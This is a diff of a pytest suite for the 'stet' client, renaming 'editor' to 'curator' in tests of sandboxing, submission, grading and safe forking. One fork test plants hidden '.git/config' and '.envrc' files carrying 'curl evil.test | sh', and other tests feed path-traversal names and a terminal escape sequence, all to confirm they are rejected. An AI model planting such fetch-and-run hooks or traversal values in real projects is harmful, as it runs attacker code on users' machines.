@@ -190,7 +190,7 @@ def loop(monkeypatch):
     from stet import bench, cli, env
 
     # This machine, as far as `stet verify` can tell, has the season's libraries and is fast
-    # enough to run editors. The tests of those checks say otherwise where they need to.
+    # enough to run curators. The tests of those checks say otherwise where they need to.
     monkeypatch.setattr(env, "problems", lambda *a, **k: [])
     monkeypatch.setattr(bench, "saved", lambda *a, **k: FAST_MACHINE)
     monkeypatch.setattr(bench, "measure", lambda *a, **k: pytest.fail("the machine's speed was measured in a test"))
@@ -420,7 +420,7 @@ def test_the_organisers_machine_does_not_start_without_the_held_out_exam(loop, m
     loop.me = {"account": {"handle": "tester"}, "verifier": {"established": True}}
     args = Args()
     args.edits = True
-    with pytest.raises(Stop):  # a volunteer never holds it: it grades, and it runs editors if it has the standing
+    with pytest.raises(Stop):  # a volunteer never holds it: it grades, and it runs curators if it has the standing
         client.cmd_verify(args)
     assert loop.graded == [7]
 
@@ -461,7 +461,7 @@ def test_what_a_grade_prints_is_cleaned_and_counted(loop, capsys):
 
 @pytest.fixture
 def edit(monkeypatch, tmp_path):
-    """An edit job up to the point where the editor would start."""
+    """An edit job up to the point where the curator would start."""
     import hashlib
     import types
 
@@ -499,7 +499,7 @@ def test_a_bundle_that_cannot_be_loaded_is_the_entrants_failure_and_is_reported(
 
     monkeypatch.setattr(project, "MAX_UNPACKED_BYTES", 1 << 20)
     bomb = zstandard.ZstdCompressor().compress(b"\0" * (8 << 20))
-    no_manifest = bundle([("editor.py", b"")])
+    no_manifest = bundle([("curator.py", b"")])
     bad_manifest = bundle([("stet.toml", b"x = " + b"[" * 5000 + b"]" * 5000)])
     for blob, why in ((b"not a bundle", "zstd"), (bomb, "more than 1 MB"), (no_manifest, "no stet.toml"), (bad_manifest, "not valid TOML")):
         payload = edit(blob)
@@ -625,17 +625,17 @@ def test_fork_does_not_let_the_server_choose_where_files_go(monkeypatch, tmp_pat
     from test_project import bundle
 
     monkeypatch.chdir(tmp_path)
-    blob = bundle([("stet.toml", b'name = "tidy"\nentry = "python editor.py"\n'), ("editor.py", b"")])
+    blob = bundle([("stet.toml", b'name = "tidy"\nentry = "python curator.py"\n'), ("curator.py", b"")])
     for over in ({"name": "../../evil"}, {"name": "/tmp/evil"}, {"name": ".ssh"}, {"name": None}, {"id": "../x"}, {"id": SHA}):
         serve(monkeypatch, blob, **over)
         with pytest.raises(SystemExit):
             client.cmd_fork(ForkArgs("ann/tidy"))
     editor = serve(monkeypatch, blob)
     with pytest.raises(SystemExit):
-        client.cmd_fork(ForkArgs("cd" * 32))  # asked for one editor by its id, answered with another
+        client.cmd_fork(ForkArgs("cd" * 32))  # asked for one curator by its id, answered with another
     assert not list(tmp_path.iterdir())
     client.cmd_fork(ForkArgs(editor["id"][:12]))
-    assert sorted(p.name for p in (tmp_path / "tidy").iterdir()) == [".gitignore", "AGENTS.md", "editor.py", "stet.toml"]
+    assert sorted(p.name for p in (tmp_path / "tidy").iterdir()) == [".gitignore", "AGENTS.md", "curator.py", "stet.toml"]
 
 
 def test_a_fork_holds_no_hidden_files_and_says_whose_program_it_is(monkeypatch, tmp_path, capsys):
@@ -643,12 +643,12 @@ def test_a_fork_holds_no_hidden_files_and_says_whose_program_it_is(monkeypatch, 
 
     monkeypatch.chdir(tmp_path)
     blob = bundle([
-        ("stet.toml", b'name = "tidy"\nparent = "x"\nentry = "python editor.py"\n'), ("editor.py", b"print(1)\n"),
+        ("stet.toml", b'name = "tidy"\nparent = "x"\nentry = "python curator.py"\n'), ("curator.py", b"print(1)\n"),
         (".git/config", b"[core]\n\tfsmonitor = curl evil.test | sh\n"), (".envrc", b"curl evil.test | sh\n"), (".vscode/tasks.json", b"{}"),
     ])  # fmt: skip
     editor = serve(monkeypatch, blob)
     client.cmd_fork(ForkArgs("ann/tidy", dest="mine"))
-    assert sorted(p.name for p in (tmp_path / "mine").iterdir()) == [".gitignore", "AGENTS.md", "editor.py", "stet.toml"]
+    assert sorted(p.name for p in (tmp_path / "mine").iterdir()) == [".gitignore", "AGENTS.md", "curator.py", "stet.toml"]
     assert f'parent = "{editor["id"]}"' in (tmp_path / "mine" / "stet.toml").read_text()
     err = capsys.readouterr().err
     assert "someone else's program" in err and "stet run --sandbox" in err and "Left out 3 files" in err
@@ -670,8 +670,8 @@ def test_submit_shows_every_file_it_would_publish_before_it_sends_anything(monke
     monkeypatch.setattr(client, "request", lambda *a, **k: pytest.fail("a dry run sent something"))
     client.cmd_submit(SubmitArgs(p.path))  # needs no account
     err = capsys.readouterr().err
-    assert "an-editor: 3 files" in err and "Nothing was sent." in err
-    for shown in ("editor.py", "notes/todo.txt", "stet.toml", ".env  (its name starts with a dot)", "venv/  (it is under venv/)", ".git/  (its name starts with a dot)"):
+    assert "a-curator: 3 files" in err and "Nothing was sent." in err
+    for shown in ("curator.py", "notes/todo.txt", "stet.toml", ".env  (its name starts with a dot)", "venv/  (it is under venv/)", ".git/  (its name starts with a dot)"):
         assert shown in err
     assert "secret" not in err
     # A real submission prints the same list before it asks. With no terminal and no --yes, it stops there.
@@ -740,7 +740,7 @@ def test_what_the_held_out_exam_said_is_kept_here_and_never_reported():
     assert first["round"] == "s0-o00007" and first["editor"]["name"] == "sieve" and first["script_sha256"] == "ab" * 32
     assert first["heldout"] == {"loss": 4.61234, "baseline": 5.56789, "by_source": {"news": 4.61234}, "baseline_by_source": {"news": 5.56789}}
     assert first["public"] == {"loss": 4.4, "baseline": 5.3}
-    # Two editors may write the same script. Each grade is a line of its own, under its editor's name.
+    # Two curators may write the same script. Each grade is a line of its own, under its curator's name.
     assert second["editor"]["id"] == "e" * 64 and second["script_sha256"] == first["script_sha256"]
 
 
@@ -869,7 +869,7 @@ def test_a_relay_that_cannot_be_read_has_said_nothing(monkeypatch):
 
 class AnchorArgs(Args):
     edits = True
-    no_sandbox = True  # with STET_DEV=1: these tests run no editor, and need no bubblewrap
+    no_sandbox = True  # with STET_DEV=1: these tests run no curator, and need no bubblewrap
 
 
 @pytest.fixture
@@ -892,7 +892,7 @@ def test_the_organisers_machine_stops_with_the_job_in_hand_when_it_cannot_vouch_
     assert "does not follow" in err and "Stopping with the job still held" in err
 
     # A volunteer hands it back and takes no more of that round this session, whether or
-    # not it runs editors.
+    # not it runs curators.
     anchor.me = {"account": {"handle": "tester"}, "verifier": {"established": True}}
     anchor.claims, anchor.graded[:] = [a_job(id=3), a_job(id=4), a_job(id=5, round={"id": "s0-o00002"})], []
     anchor.grade = [client.RoundRefused("the seed does not follow"), None]
@@ -1164,11 +1164,11 @@ def test_submit_says_which_round_only_when_the_server_expects_it_there(monkeypat
     key.save()
     args = SubmitArgs(p.path)
     args.dry_run, args.yes = False, True
-    editor = {"name": "an-editor", "version": 1, "id": "ab" * 32}
+    editor = {"name": "a-curator", "version": 1, "id": "ab" * 32}
     for reply, said, unsaid in (
         ({"enters": {"round": "s0-o00002", "draw_at": 0}}, "It enters round s0-o00002.", "earliest"),
         ({"earliest": {"round": "s0-o00002", "draw_at": 0}, "message": "The queue is longer than one round can take."}, "The earliest round it can enter is s0-o00002.", "It enters"),
-        ({}, "Submitted an-editor v1", "round"),
+        ({}, "Submitted a-curator v1", "round"),
     ):
         monkeypatch.setattr(client, "request", lambda *a, reply=reply, **k: {"editor": editor, "url": "http://x/editors/abab", **reply})
         client.cmd_submit(args)
@@ -1201,7 +1201,7 @@ def test_a_machine_slower_than_the_floor_takes_no_edit_jobs_and_is_told_it_can_g
     with pytest.raises(SystemExit):
         client.cmd_verify(args)
     err = capsys.readouterr().err
-    assert "cannot run editors for the leaderboard" in err and "slower than the floor" in err and "It can still grade" in err
+    assert "cannot run curators for the leaderboard" in err and "slower than the floor" in err and "It can still grade" in err
 
 
 def test_a_grader_with_another_pytorch_is_turned_away_before_it_grades(loop, monkeypatch, capsys):
@@ -1223,7 +1223,7 @@ def test_an_account_is_told_where_it_stands():
     # is told what is missing, in numbers.
     said = client.standing_line({}, {"validated": 2, "establish_after": 5, "needs_github": True})
     assert "not yet established" in said and "3 more grades that agree" in said and "stet login --github" in said
-    assert client.standing_line({}, {"validated": 9, "established": True, "runs": 4}) == "established: its runs and grades count towards scores; 4 editors run"
+    assert client.standing_line({}, {"validated": 9, "established": True, "runs": 4}) == "established: its runs and grades count towards scores; 4 curators run"
     assert "Still to come" not in client.standing_line({}, {})  # an older server says nothing about it
     assert "more grades" not in client.standing_line({}, {"validated": True, "establish_after": "5"})  # and nonsense is not arithmetic
 
@@ -1234,8 +1234,8 @@ def test_a_volunteer_who_asks_to_run_editors_before_it_is_established_is_told_wh
     monkeypatch.setenv("STET_DEV", "1")
     for check in ("bwrap_available", "scope_available", "sandbox_selftest"):
         monkeypatch.setattr(runner, check, lambda: (True, ""))
-    # The server says, with each answer, whether this machine is handed editors, and why not.
-    why = "editors are run by established verifiers: accounts with 5 grades that agreed. This one has 2"
+    # The server says, with each answer, whether this machine is handed curators, and why not.
+    why = "curators are run by established verifiers: accounts with 5 grades that agreed. This one has 2"
     loop.claims = [a_job(), a_job(id=8), a_job(id=9), a_job(id=10)]
     loop.runner = [{"eligible": False, "reason": why}, {"eligible": False, "reason": why + "\x1b[2J"}, {"eligible": True, "reason": ""}, {"eligible": True}]
     args = Args()
@@ -1244,18 +1244,18 @@ def test_a_volunteer_who_asks_to_run_editors_before_it_is_established_is_told_wh
         client.cmd_verify(args)
     err = capsys.readouterr().err
     # Said once while it stays the same, in the server's words made safe to print, and unsaid when it changes.
-    assert err.count("Not given editors to run: editors are run by established verifiers") == 2 and "\x1b" not in err
-    assert err.count("This one has 2. Given grading meanwhile.") == 1 and err.count("now given editors to run") == 1 and loop.graded == [7, 8, 9, 10]
+    assert err.count("Not given curators to run: curators are run by established verifiers") == 2 and "\x1b" not in err
+    assert err.count("This one has 2. Given grading meanwhile.") == 1 and err.count("now given curators to run") == 1 and loop.graded == [7, 8, 9, 10]
     # A machine that may run them from the start is told nothing of the kind.
     loop.claims, loop.runner = [a_job()], [{"eligible": True, "reason": ""}]
     with pytest.raises(Stop):
         client.cmd_verify(args)
     err = capsys.readouterr().err
-    assert "Not given editors" not in err and "now given" not in err
+    assert "Not given curators" not in err and "now given" not in err
 
 
 def test_a_volunteer_who_runs_editors_hands_back_what_it_cannot_finish(loop, monkeypatch):
-    # Only the organisers' machine keeps a job through a stop. A volunteer who runs editors
+    # Only the organisers' machine keeps a job through a stop. A volunteer who runs curators
     # is still a volunteer: its job goes back, so that someone else can take it.
     from stet import runner
 
